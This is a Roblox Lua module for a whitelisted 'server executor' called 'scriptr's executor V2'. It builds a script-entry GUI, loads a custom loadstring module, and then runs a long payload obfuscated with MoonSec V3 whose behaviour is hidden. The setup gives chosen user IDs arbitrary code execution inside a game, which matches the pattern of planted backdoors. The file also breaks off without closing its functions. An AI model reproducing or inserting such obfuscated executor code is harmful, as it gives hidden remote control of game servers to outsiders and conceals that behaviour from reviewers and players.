local module = {}

module.loaded = false
module.whitelist = nil

module.getcoredata = function(whitelist)
	module.whitelist = whitelist

	if module.whitelist then
		module.loaded = true
	end
end

local loadstring = require(game:GetService("ReplicatedStorage").loadstring)

function module:createGUI(player)
	if module.loaded == false and module.whitelist == nil and player:FindFirstChild("PlayerGui"):FindFirstChild("exec") then
	else
		if table.find(module.whitelist, player.UserId) then
			exec = Instance.new("ScreenGui")
			execute2 = Instance.new("RemoteEvent")
			main = Instance.new("Frame")
			UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
			title = Instance.new("TextLabel")
			buttons = Instance.new("Frame")
			execute = Instance.new("TextButton")
			UICorner = Instance.new("UICorner")
			shadow = Instance.new("Frame")
			UICorner_2 = Instance.new("UICorner")
			UITextSizeConstraint = Instance.new("UITextSizeConstraint")
			UIGridLayout = Instance.new("UIGridLayout")
			clear = Instance.new("TextButton")
			UICorner_3 = Instance.new("UICorner")
			shadow_2 = Instance.new("Frame")
			UICorner_4 = Instance.new("UICorner")
			UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
			scriptlist = Instance.new("TextButton")
			UICorner_5 = Instance.new("UICorner")
			shadow_3 = Instance.new("Frame")
			UICorner_6 = Instance.new("UICorner")
			UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
			settingz = Instance.new("TextButton")
			UICorner_7 = Instance.new("UICorner")
			shadow_4 = Instance.new("Frame")
			UICorner_8 = Instance.new("UICorner")
			UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
			exec_2 = Instance.new("Frame")
			scripteditor = Instance.new("ScrollingFrame")
			scriptbox = Instance.new("TextBox")
			otherscripts = Instance.new("Frame")
			TextLabel = Instance.new("TextLabel")
			settings_2 = Instance.new("Frame")
			TextLabel_2 = Instance.new("TextLabel")

			exec.Name = "exec"
			exec.Enabled = true
			exec.ResetOnSpawn = false
			exec.IgnoreGuiInset = true
			exec.Parent = player:FindFirstChild("PlayerGui")

			execute2.Name = "execute"
			execute2.Parent = exec

			main.Name = "main"
			main.Parent = exec
			main.AnchorPoint = Vector2.new(0.5, 0.5)
			main.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
			main.BorderColor3 = Color3.fromRGB(0, 0, 0)
			main.BorderSizePixel = 0
			main.Position = UDim2.new(0.5, 0, 0.5, 0)
			main.Size = UDim2.new(0.5, 0, 0.400000006, 0)

			UIAspectRatioConstraint.Parent = main
			UIAspectRatioConstraint.AspectRatio = 2.042

			title.Name = "title"
			title.Parent = main
			title.AnchorPoint = Vector2.new(0.5, 0.5)
			title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			title.BorderSizePixel = 0
			title.Position = UDim2.new(0.5, 0, 0.0500000007, 0)
			title.Size = UDim2.new(1, 0, 0.100000009, 0)
			title.Font = Enum.Font.SourceSansBold
			title.RichText = true
			title.Text = "scriptr's executor<font color = \"rgb(0,200,0)\"><font size = \"5\">V2</font></font>"
			title.TextColor3 = Color3.fromRGB(255, 255, 255)
			title.TextScaled = true
			title.TextSize = 14.000
			title.TextWrapped = true
			title.TextXAlignment = Enum.TextXAlignment.Left

			buttons.Name = "buttons"
			buttons.Parent = main
			buttons.AnchorPoint = Vector2.new(0.5, 0.5)
			buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			buttons.BackgroundTransparency = 1.000
			buttons.BorderColor3 = Color3.fromRGB(0, 0, 0)
			buttons.BorderSizePixel = 0
			buttons.Position = UDim2.new(0.5, 0, 0.899999976, 0)
			buttons.Size = UDim2.new(0.95, 0, 0.18, 0)

			execute.Name = "execute"
			execute.Parent = buttons
			execute.AnchorPoint = Vector2.new(0.5, 0.5)
			execute.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
			execute.BorderSizePixel = 0
			execute.Size = UDim2.new(0.244, 0, 1, 0)
			execute.ZIndex = 2
			execute.Font = Enum.Font.SourceSansSemibold
			execute.Text = "EXECUTE"
			execute.TextColor3 = Color3.fromRGB(255, 255, 255)
			execute.TextScaled = true
			execute.TextSize = 36.000
			execute.TextWrapped = true

			UICorner.Parent = execute

			shadow.Name = "shadow"
			shadow.Parent = execute
			shadow.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow.BorderSizePixel = 0
			shadow.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow.Size = UDim2.new(1, 0, 1, 0)

			UICorner_2.Parent = shadow

			UITextSizeConstraint.Parent = execute
			UITextSizeConstraint.MaxTextSize = 36

			UIGridLayout.Parent = buttons
			UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			UIGridLayout.CellSize = UDim2.new(0.244, 0, 1, 0)
			UIGridLayout.CellPadding = UDim2.new(0.008, 0, 0, 0)

			clear.Name = "clear"
			clear.Parent = buttons
			clear.AnchorPoint = Vector2.new(0.5, 0.5)
			clear.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
			clear.BorderSizePixel = 0
			clear.Size = UDim2.new(0.244, 0, 1, 0)
			clear.ZIndex = 2
			clear.Font = Enum.Font.SourceSansSemibold
			clear.Text = "CLEAR"
			clear.TextColor3 = Color3.fromRGB(255, 255, 255)
			clear.TextScaled = true
			clear.TextSize = 36.000
			clear.TextWrapped = true

			UICorner_3.Parent = clear

			shadow_2.Name = "shadow"
			shadow_2.Parent = clear
			shadow_2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_2.BorderSizePixel = 0
			shadow_2.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_2.Size = UDim2.new(1, 0, 1, 0)

			UICorner_4.Parent = shadow_2

			UITextSizeConstraint_2.Parent = clear
			UITextSizeConstraint_2.MaxTextSize = 36

			scriptlist.Name = "scriptlist"
			scriptlist.Parent = buttons
			scriptlist.AnchorPoint = Vector2.new(0.5, 0.5)
			scriptlist.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			scriptlist.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scriptlist.BorderSizePixel = 0
			scriptlist.Size = UDim2.new(0.244, 0, 1, 0)
			scriptlist.ZIndex = 2
			scriptlist.Font = Enum.Font.SourceSansSemibold
			scriptlist.Text = "OTHER SCRIPTS"
			scriptlist.TextColor3 = Color3.fromRGB(255, 255, 255)
			scriptlist.TextScaled = true
			scriptlist.TextSize = 20.000
			scriptlist.TextWrapped = true

			UICorner_5.Parent = scriptlist

			shadow_3.Name = "shadow"
			shadow_3.Parent = scriptlist
			shadow_3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_3.BorderSizePixel = 0
			shadow_3.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_3.Size = UDim2.new(1, 0, 1, 0)

			UICorner_6.Parent = shadow_3

			UITextSizeConstraint_3.Parent = scriptlist
			UITextSizeConstraint_3.MaxTextSize = 20

			settingz.Name = "settings"
			settingz.Parent = buttons
			settingz.AnchorPoint = Vector2.new(0.5, 0.5)
			settingz.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			settingz.BorderColor3 = Color3.fromRGB(0, 0, 0)
			settingz.BorderSizePixel = 0
			settingz.Size = UDim2.new(0.244, 0, 1, 0)
			settingz.ZIndex = 2
			settingz.Font = Enum.Font.SourceSansSemibold
			settingz.Text = "SETTINGS"
			settingz.TextColor3 = Color3.fromRGB(255, 255, 255)
			settingz.TextScaled = true
			settingz.TextSize = 36.000
			settingz.TextWrapped = true

			UICorner_7.Parent = settingz

			shadow_4.Name = "shadow"
			shadow_4.Parent = settingz
			shadow_4.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_4.BorderSizePixel = 0
			shadow_4.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_4.Size = UDim2.new(1, 0, 1, 0)

			UICorner_8.Parent = shadow_4

			UITextSizeConstraint_4.Parent = settingz
			UITextSizeConstraint_4.MaxTextSize = 36

			exec_2.Name = "exec"
			exec_2.Parent = main
			exec_2.AnchorPoint = Vector2.new(0.5, 0.5)
			exec_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			exec_2.BackgroundTransparency = 1.000
			exec_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			exec_2.BorderSizePixel = 0
			exec_2.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			exec_2.Size = UDim2.new(1, 0, 0.699999988, 0)

			scripteditor.Name = "scripteditor"
			scripteditor.Parent = exec_2
			scripteditor.Active = true
			scripteditor.AnchorPoint = Vector2.new(0.5, 0.5)
			scripteditor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			scripteditor.BackgroundTransparency = 1.000
			scripteditor.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scripteditor.BorderSizePixel = 0
			scripteditor.Position = UDim2.new(0.5, 0, 0.5, 0)
			scripteditor.Size = UDim2.new(0.800000012, 0, 0.800000012, 0)
			scripteditor.CanvasSize = UDim2.new(0, 0, 0.600000024, 0)
			scripteditor.ScrollBarThickness = 0

			scriptbox.Name = "scriptbox"
			scriptbox.Parent = scripteditor
			scriptbox.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
			scriptbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scriptbox.BorderSizePixel = 0
			scriptbox.Size = UDim2.new(1, 0, 1, 0)
			scriptbox.ClearTextOnFocus = false
			scriptbox.Font = Enum.Font.SourceSans
			scriptbox.MultiLine = true
			scriptbox.Text = ""
			scriptbox.TextColor3 = Color3.fromRGB(255, 255, 255)
			scriptbox.TextSize = 20.000
			scriptbox.TextXAlignment = Enum.TextXAlignment.Left
			scriptbox.TextYAlignment = Enum.TextYAlignment.Top

			otherscripts.Name = "otherscripts"
			otherscripts.Parent = main
			otherscripts.AnchorPoint = Vector2.new(0.5, 0.5)
			otherscripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			otherscripts.BackgroundTransparency = 1.000
			otherscripts.BorderColor3 = Color3.fromRGB(0, 0, 0)
			otherscripts.BorderSizePixel = 0
			otherscripts.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			otherscripts.Size = UDim2.new(1, 0, 0.699999988, 0)
			otherscripts.Visible = false

			TextLabel.Parent = otherscripts
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Size = UDim2.new(1, 0, 1, 0)
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.Text = "data."
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
			TextLabel.TextWrapped = true

			settings_2.Name = "settings"
			settings_2.Parent = main
			settings_2.AnchorPoint = Vector2.new(0.5, 0.5)
			settings_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			settings_2.BackgroundTransparency = 1.000
			settings_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			settings_2.BorderSizePixel = 0
			settings_2.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			settings_2.Size = UDim2.new(1, 0, 0.699999988, 0)
			settings_2.Visible = false

			TextLabel_2.Parent = settings_2
			TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel_2.BackgroundTransparency = 1.000
			TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel_2.BorderSizePixel = 0
			TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
			TextLabel_2.Font = Enum.Font.SourceSans
			TextLabel_2.Text = "MASSIVE WIP"
			TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
			TextLabel_2.TextScaled = true
			TextLabel_2.TextSize = 14.000
			TextLabel_2.TextWrapped = true
		end
	end
end

function module:givegui(player)
	if not player:FindFirstChild("PlayerGui"):FindFirstChild("exec") and table.find(module.whitelist, player.UserId) then
		local gui = module:createGUI(player)
		local serverscripts = ([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _MZnuOmzMeovZ = a; end)); do return(function(r,...)local s;local c;local d;local o;local f;local t;local e=24915;local n=0;local l={};while n<687 do n=n+1;while n<0x121 and e%0x36b2<0x1b59 do n=n+1 e=(e+909)%42116 local a=n+e if(e%0x1dd4)<=0xeea then e=(e+0x151)%0x66ab while n<0x3c1 and e%0x1766<0xbb3 do n=n+1 e=(e-115)%17098 local t=n+e if(e%0x27ea)<=0x13f5 then e=(e-0x354)%0x8143 local e=63424 if not l[e]then l[e]=0x1 d=getfenv and getfenv();end elseif e%2~=0 then e=(e*0x87)%0x9ade local e=12181 if not l[e]then l[e]=0x1 d=(not d)and _ENV or d;end else e=(e+0x338)%0x5740 n=n+1 local e=96776 if not l[e]then l[e]=0x1 s=tonumber;end end end elseif e%2~=0 then e=(e*0x80)%0x4bc9 while n<0x162 and e%0xf12<0x789 do n=n+1 e=(e*443)%16387 local a=n+e if(e%0x1df4)<0xefa then e=(e*0x376)%0x8738 local e=54216 if not l[e]then l[e]=0x1 end elseif e%2~=0 then e=(e*0x2e5)%0x8c7e local e=9601 if not l[e]then l[e]=0x1 f="\4\8\116\111\110\117\109\98\101\114\122\107\84\74\109\80\90\108\0\6\115\116\114\105\110\103\4\99\104\97\114\68\108\107\112\111\114\74\101\0\6\115\116\114\105\110\103\3\115\117\98\115\88\105\118\106\120\112\65\0\6\115\116\114\105\110\103\4\98\121\116\101\90\117\117\87\72\102\114\118\0\5\116\97\98\108\101\6\99\111\110\99\97\116\107\75\97\80\88\99\70\67\0\5\116\97\98\108\101\6\105\110\115\101\114\116\87\109\116\106\71\74\73\66\5";end else e=(e+0x19e)%0x4c3d n=n+1 local e=34004 if not l[e]then l[e]=0x1 t=function(t)local e=0x01 local function l(n)e=e+n return t:sub(e-n,e-0x01)end while true do local n=l(0x01)if(n=="\5")then break end local e=c.byte(l(0x01))local e=l(e)if n=="\2"then e=o.zkTJmPZl(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then d[e]=function(e,n)return r(8,nil,r,n,e)end elseif n=="\4"then e=d[e]elseif n=="\0"then e=d[e][l(c.byte(l(0x01)))];end local n=l(0x08)o[n]=e end end end end end else e=(e*0x3fb)%0x97ba n=n+1 while n<0x337 and e%0x2040<0x1020 do n=n+1 e=(e-151)%25544 local d=n+e if(e%0x3b1a)<=0x1d8d then e=(e+0x21a)%0xa32c local e=92911 if not l[e]then l[e]=0x1 c=string;end elseif e%2~=0 then e=(e*0x1c9)%0xa639 local e=16962 if not l[e]then l[e]=0x1 o={};end else e=(e+0xed)%0x2b27 n=n+1 local e=27194 if not l[e]then l[e]=0x1 end end end end end e=(e-962)%32567 end t(f);local e={};for n=0x0,0xff do local l=o.DlkporJe(n);e[n]=l;e[l]=n;end local function a(n)return e[n];end local c=(function(f,r)local c,l=0x01,0x10 local n={{},{},{}}local d=-0x01 local e=0x01 local t=f while true do n[0x03][o.sXivjxpA(r,e,(function()e=c+e return e-0x01 end)())]=(function()d=d+0x01 return d end)()if d==(0x0f)then d=""l=0x000 break end end local d=#r while e<d+0x01 do n[0x02][l]=o.sXivjxpA(r,e,(function()e=c+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 o.WmtjGJIB(n[0x01],(a((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+t)%0x100)));t=f+t;end end return o.kKaPXcFC(n[0x01])end);t(c(246,"}8AmlF)05z_&gHxtCt"));t(c(21,"siwGDd2ucr/mlq5U5mqlGDw:(r5mqmmUDurwc5uidUD2w5irUolcmGqOcqG2wwucd2GUGdwJ3UqG5iqc//rdrm2dUc5uGqw/)lUl5q/qmqcruiuuD5GUGwml/qIdUiq/ml/lr,ir2lDmDrwGiG5/lmmdmqmwud2w2u55qqGiin=55qudlu//r2rDuuddD5G2wDUuUilcqiD5DirGuL2/D5Giwm0G_iqrldm/r5cucrDlD2GuwDUrLrc,25/c/wcmcu2qdmOuwmi2Tl5m5i/fcDrGim;22DGrwlwwFD5l5dlGmwrmcr2rUGqq-,UD5/Ur5mqim,rludP5UqdDG/wridU55pqomD/wcd2cDlwrimGVUdrCc*q/mwr5rGuu_GdqDiw5K/Uu5/lw/2curc2d2cdGG/l2mGhqUiq5m//ur/rwDU27w/wUiq5Dl5u22wmc/dcuuu2cddiiU5Ji5GlcmDmiGmwccLdqDUGGilicW2lq/r/Gcccrciu25uq2w/prNu5225m//mrrcDuwwUD/iuwwqq5qqrlDDc"));local e=(-2105+(function()local t,e=0,1;(function(n,e,l)e(l(e,n,l),e(n,e,n),l(n,e,e))end)(function(n,l,d)if t>475 then return n end t=t+1 e=(e+408)%49299 if(e%1706)>=853 then return n(l(n,n,d),n(n,n,n),l(n and n,d and n,l))else return n end return l end,function(n,l,d)if t>326 then return d end t=t+1 e=(e*816)%17788 if(e%1458)>=729 then e=(e*636)%35533 return n else return d(d(l,l and d,n),d(d,n,d),l(l,n,l))end return n(l(n,l,d),n(n and l,n and n,d and l),l(l,n,d))end,function(d,l,n)if t>238 then return n end t=t+1 e=(e-282)%11715 if(e%1844)>=922 then e=(e+838)%39078 return n(n(n,n,n),n(d,l,n),l(l,l,d and n))else return n end return n end)return e;end)())local a=o.xJpOilHG or o.XQGmOggc;local y=(getfenv)or(function()return _ENV end);local ee=1;local d=2;local t=3;local f=4;local function _(b,...)local u=c(e,"Mr;:UxDbhk+iS-2 + US ;khUr2 h+:7-DSUkD:S-2Dbr -;bSrxixx-+rx-2+k}:D;k rkb:SSbb ;:Sxx ;DS+Dbr;irD:-2+xUD2Sk:U;iikU:+-2rxSex2yU++kbxirWh:xizb+;:-h:b:SSb;rh;D-hb2;GSk:D-rbbD! xirB22-kxUD2*k:;D- h:riS2DxrbiSDh  +2x+i+kxUb2ix:r;ixD;9b+2x-2 kiU>-:bD:k-ihD::-hD ;:SxD;0D+kD; xhi:;-khU;:Sb+DU-ikk-:b2xkO b2rU;;D-xDb+ bk hk2UU:2 hk U +;h2:b2<b 2J--D-;xbhD2rDikDU ik xD2-k; U rhk:+-U:;%xS-b:rh+:xi  D;:2Sr:b2Uh*;DSS-2hbr Shb-;UShDxr9+  r+r:+2uhDhir -;hS:kikb-:1+kDbrbSUU2k-UU2DhS:;: - kr; b:;%iSD;^h xikD2 :+ix2{h+rUr2k:--9bDrSS;b }2iUx+?r+DUS ;++U 2Uh+:_-hbS;;Shh.;+i+Dw?Di:x; hk2D+R:k{:D-Shh;hS bUr SmD+(-i;xh 2++U+ rkDUc2:hh;2-Uhr;9SbDSr;S2x2RU++xr DkSU; ++::U-+hm;SSSb;rh-HD2l+irxDLU+;Uh22iU:-2whb;S-:bh;bSUbS;biDx Z;+kU2 Uk+U5 khS::-hhr;USSb):D-UD;ok+2xx ++:UD 2k-:h2rhU;2-*bDrSS;b2Y2ihx+9r+DUS ;khUx2Uhi:u-+bS;;ShD2rhi+D?*D+Sx; +k2UU ;k4:D-Sh:;hS bUr+SbDDaSi;xk 2+UU+ fkD:S2;hh");local n=0;o.pIlx__zY(function()o.khvimknc()n=n+1 end)local function e(l,e)if e then return n end;n=l+n;end local l,n,h=r(0,r,e,u,o.ZuuWHfrv);local function c()local n,l=o.ZuuWHfrv(u,e(1,3),e(5,6)+2);e(2);return(l*256)+n;end;local k=true;local k=0 local function p()local d=n();local e=n();local t=1;local d=(l(e,1,20)*(2^32))+d;local n=l(e,21,31);local e=((-1)^l(e,32));if(n==0)then if(d==k)then return e*0;else n=1;t=0;end;elseif(n==2047)then return(d==0)and(e*(1/0))or(e*(0/0));end;return o.cqnqYhTr(e,n-1023)*(t+(d/(2^52)));end;local m=n;local function _(n)local l;if(not n)then n=m();if(n==0)then return'';end;end;l=o.sXivjxpA(u,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+k),#l do e=e..o.sXivjxpA(l,n,n)end return e;end;local m=#o.jbZSELvP(s('\49.\48'))~=1 local e=n;local function ne(...)return{...},o.wSDSMcpz('#',...)end local function g()local k={};local e={};local s={};local u={s,k,nil,e};local e=n()local a={}for d=1,e do local l=h();local n;if(l==0)then n=(h()~=#{});elseif(l==2)then local e=p();if m and o.TJIfpHJd(o.jbZSELvP(e),'.(\48+)$')then e=o.DtVvFkll(e);end n=e;elseif(l==3)then n=_();end;a[d]=n;end;for u=1,n()do local e=h();if(l(e,1,1)==0)then local r=l(e,2,3);local o=l(e,4,6);local e={c(),c(),nil,nil};if(r==0)then e[t]=c();e[f]=c();elseif(r==#{1})then e[t]=n();elseif(r==b[2])then e[t]=n()-(2^16)elseif(r==b[3])then e[t]=n()-(2^16)e[f]=c();end;if(l(o,1,1)==1)then e[d]=a[e[d]]end if(l(o,2,2)==1)then e[t]=a[e[t]]end if(l(o,3,3)==1)then e[f]=a[e[f]]end s[u]=e;end end;u[3]=h();for e=1,n()do k[e-(#{1})]=g();end;return u;end;local function _(l,n,e)local d=n;local d=e;return s(o.TJIfpHJd(o.TJIfpHJd(({o.pIlx__zY(l)})[2],n),e))end local function j(k,e,u)local function g(...)local c,z,s,j,b,l,h,_,p,m,g,n;local e=0;while-1<e do if e<3 then if 1>e then c=r(6,61,1,86,k);z=r(6,20,2,50,k);else if e~=1 then l=-41;h=-1;else s=r(6,13,3,54,k);b=ne j=0;end end else if 5<=e then if e>1 then for l=17,87 do if 6~=e then n=r(7);break;end;e=-2;break;end;else n=r(7);end else if e==3 then _={};p={...};else m=o.wSDSMcpz('#',...)-1;g={};end end end e=e+1;end;for e=0,m do if(e>=s)then _[e-s]=p[e+1];else n[e]=p[e+1];end;end;local e=m-s+1 local e;local r;local function o(...)while true do end end while true do if l<-40 then l=l+42 end e=c[l];r=e[ee];if r<=12 then if r<6 then if r<=2 then if r>0 then if r~=1 then local l=e[d]n[l]=n[l](a(n,l+1,e[t]))else l=e[t];end else local e=e[d]n[e]=n[e](a(n,e+1,h))end else if 3<r then if 3<r then for o=21,72 do if 5>r then local t;t=e[d]n[t]=n[t](a(n,t+1,h))l=l+1;e=c[l];n[e[d]]();l=l+1;e=c[l];do return end;break;end;local l=e[d]local d,e=b(n[l](a(n,l+1,e[t])))h=e+l-1 local e=0;for l=l,h do e=e+1;n[l]=d[e];end;break;end;else local t;t=e[d]n[t]=n[t](a(n,t+1,h))l=l+1;e=c[l];n[e[d]]();l=l+1;e=c[l];do return end;end else n[e[d]]();end end else if r>8 then if 10>=r then if r~=9 then local r,o;for h=0,6 do if 2<h then if 4>=h then if 1<=h then for u=12,78 do if h>3 then r=e[d];o=n[e[t]];n[r+1]=o;n[r]=o[e[f]];l=l+1;e=c[l];break;end;r=e[d]n[r]=n[r](a(n,r+1,e[t]))l=l+1;e=c[l];break;end;else r=e[d]n[r]=n[r](a(n,r+1,e[t]))l=l+1;e=c[l];end else if 6==h then n[e[d]]=(e[t]~=0);else n(e[d],e[t]);l=l+1;e=c[l];end end else if h>=1 then if-1<h then for a=11,61 do if 2>h then r=e[d];o=n[e[t]];n[r+1]=o;n[r]=o[e[f]];l=l+1;e=c[l];break;end;n(e[d],e[t]);l=l+1;e=c[l];break;end;else r=e[d];o=n[e[t]];n[r+1]=o;n[r]=o[e[f]];l=l+1;e=c[l];end else n[e[d]]=u[e[t]];l=l+1;e=c[l];end end end else n[e[d]]=(e[t]~=0);end else if r>=10 then for l=29,80 do if r~=12 then do return end;break;end;local r,f,c,o,a;local l=0;while l>-1 do if l>=3 then if 5>l then if l>=-1 then repeat if l>3 then a=r[f];break;end;o=r[c];until true;else o=r[c];end else if 5<l then l=-2;else n(a,o);end end else if 0<l then if 2==l then c=t;else f=d;end else r=e;end end l=l+1 end break;end;else do return end;end end else if 7>r then n[e[d]]();else if 4<=r then repeat if r~=8 then local l=e[d]local d,e=b(n[l](a(n,l+1,e[t])))h=e+l-1 local e=0;for l=l,h do e=e+1;n[l]=d[e];end;break;end;u[e[t]]=n[e[d]];until true;else local l=e[d]local d,e=b(n[l](a(n,l+1,e[t])))h=e+l-1 local e=0;for l=l,h do e=e+1;n[l]=d[e];end;end end end end else if 20<=r then if r>=23 then if r<25 then if 23~=r then l=e[t];else for r=0,3 do if r>=2 then if-1~=r then repeat if 2~=r then if(n[e[d]]==e[f])then l=l+1;else l=e[t];end;break;end;n[e[d]]=u[e[t]];l=l+1;e=c[l];until true;else if(n[e[d]]==e[f])then l=l+1;else l=e[t];end;end else if r>=-3 then repeat if r>0 then u[e[t]]=n[e[d]];l=l+1;e=c[l];break;end;n[e[d]]=(e[t]~=0);l=l+1;e=c[l];until true;else u[e[t]]=n[e[d]];l=l+1;e=c[l];end end end end else if r>22 then repeat if 25~=r then local l=e[d];local d=n[e[t]];n[l+1]=d;n[l]=d[e[f]];break;end;n[e[d]]=u[e[t]];until true;else local l=e[d];local d=n[e[t]];n[l+1]=d;n[l]=d[e[f]];end end else if r<=20 then local l=e[d]n[l]=n[l](a(n,l+1,e[t]))else if r>=17 then for l=17,63 do if r<22 then n[e[d]]=u[e[t]];break;end;do return end;break;end;else do return end;end end end else if r<=15 then if r<=13 then if(n[e[d]]==e[f])then l=l+1;else l=e[t];end;else if 14~=r then u[e[t]]=n[e[d]];else n[e[d]]=(e[t]~=0);end end else if r>=18 then if 18~=r then if(n[e[d]]==e[f])then l=l+1;else l=e[t];end;else local e=e[d]n[e]=n[e](a(n,e+1,h))end else if 12<=r then for l=11,86 do if 16~=r then n(e[d],e[t]);break;end;local d=e[d];local l=n[e[t]];n[d+1]=l;n[d]=l[e[f]];break;end;else local d=e[d];local l=n[e[t]];n[d+1]=l;n[d]=l[e[f]];end end end end end l=1+l;end;end;return g end;local d=0xff;local f={};local o=(1);local t='';(function(n)local l=n local r=0x00 local e=0x00 l={(function(o)if r>0x1f then return o end r=r+1 e=(e+0xc99-o)%0x28 return(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x62);t='\37';d={function()d()end};t=t..'\100\43';end return true end)'rJwJH'and l[0x3](0xfb+o))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x22);end return true end)'CUKCy'and l[0x2](o+0x340))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x5b);end return true end)'Zisdr'and l[0x1](o+0x153))or o end),(function(c)if r>0x2c then return c end r=r+1 e=(e+0x546-c)%0x1c return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x9d);end return true end)'tjyHx'and l[0x2](0x3ce+c))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x7);d[2]=(d[2]*(_(function()f()end,a(t))-_(d[1],a(t))))+1;f[o]={};d=d[2];o=o+d;end return true end)'ckDAT'and l[0x3](c+0x273))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x78);end return true end)'mosKa'and l[0x1](c+0x39c))or c end),(function(c)if r>0x31 then return c end r=r+1 e=(e+0xb8f-c)%0x19 return(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x79);f[o]=y();o=o+d;end return true end)'pWgUa'and l[0x1](0x355+c))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xc4);end return true end)'CWQHx'and l[0x3](c+0xa2))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xcb);t={t..'\58 a',t};f[o]=g();o=o+(1);t[1]='\58'..t[1];d[2]=0xff;end return true end)'GrAec'and l[0x2](c+0x176))or c end)}l[0x1](0x2578)end){};local e=j(a(f));return e(...);end return _((function()local n={}local e=0x01;local l;if o.liiUBBtF then l=o.liiUBBtF(_)else l=''end if o.TJIfpHJd(l,o.InOLgSYa)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(l,e,n,t,d,r)local r;if l>3 then if 6>l then if 1<=l then for r=14,87 do if l<5 then local l=t;local r,t,d=d(2);do return function()local e,n,c,o=e(n,l(l,l),l(l,l)+3);l(4);return(o*r)+(c*t)+(n*d)+e;end;end;break;end;local l=t;do return function()local e=e(n,l(l,l),l(l,l));l(1);return e;end;end;break;end;else local l=t;local r,t,d=d(2);do return function()local c,e,o,n=e(n,l(l,l),l(l,l)+3);l(4);return(n*r)+(o*t)+(e*d)+c;end;end;end else if 6<l then if l==7 then do return setmetatable({},{['__\99\97\108\108']=function(e,d,l,t,n)if n then return e[n]elseif t then return e else e[d]=l end end})end else do return n(l,nil,n);end end else do return d[n]end;end end else if l<=1 then if 1>l then do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;else do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;end else if l>0 then repeat if 2<l then do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;break;end;do return 16777216,65536,256 end;until true;else do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;end end end end)) end

		serverscripts:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
